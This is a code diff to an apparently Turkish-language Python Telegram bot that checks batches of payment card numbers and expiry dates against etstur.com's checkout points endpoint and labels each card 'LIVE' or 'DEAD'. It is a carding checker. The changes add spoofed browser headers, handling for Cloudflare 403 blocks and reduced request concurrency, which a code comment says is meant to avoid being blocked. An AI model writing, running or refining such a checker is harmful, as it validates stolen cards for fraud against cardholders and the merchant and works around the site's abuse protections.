@@ -24,10 +24,17 @@ async def puan_sorgula(session, booking_uuid, kart_no, ay, yil):
 
     h = {
         "accept": "application/json, text/plain, */*",
+        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
         "authorization": "null",
         "content-type": "application/json",
         "origin": "https://www.etstur.com",
         "referer": f"https://www.etstur.com/checkout/checkout/hotel/step2?bookingUuid={booking_uuid}",
+        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     }
 
@@ -48,6 +55,8 @@ async def puan_sorgula(session, booking_uuid, kart_no, ay, yil):
             "https://www.etstur.com/services/api/hotel/payment/get-credit-card-point",
             headers=h, json=data, timeout=aiohttp.ClientTimeout(total=10)
         ) as r:
+            if r.status == 403:
+                return "403_ERR", 0, "", "Cloudflare/403 Engeli"
             if r.status != 200:
                 return "DEAD", 0, "", f"HTTP_{r.status}"
             
@@ -82,6 +91,8 @@ async def process_single(session, booking_uuid, satir):
 
     if durum == "LIVE_PUAN":
         return f"🟢 **LIVE** | `{kart_no}` | **{puan} {para}** | {mesaj}"
+    elif durum == "403_ERR":
+        return f"🚫 **403 ENGELİ** | `{kart_no}` | Sunucu IP engeli (Cloudflare)"
     elif durum == "MSG_DEAD":
         return f"🔴 **DEAD** | `{kart_no}` | {mesaj}"
     elif durum == "DEAD":
@@ -130,8 +141,8 @@ async def handle_cards(message: types.Message, state: FSMContext):
 
     status_msg = await message.answer(f"⏳ Toplam {len(satirlar)} kart taranıyor...")
     
-    sem = asyncio.Semaphore(10)
-    connector = aiohttp.TCPConnector(limit=15, force_close=True, ssl=False)
+    sem = asyncio.Semaphore(5)  # İstek hızını biraz düşürerek engellenmeyi azaltıyoruz
+    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
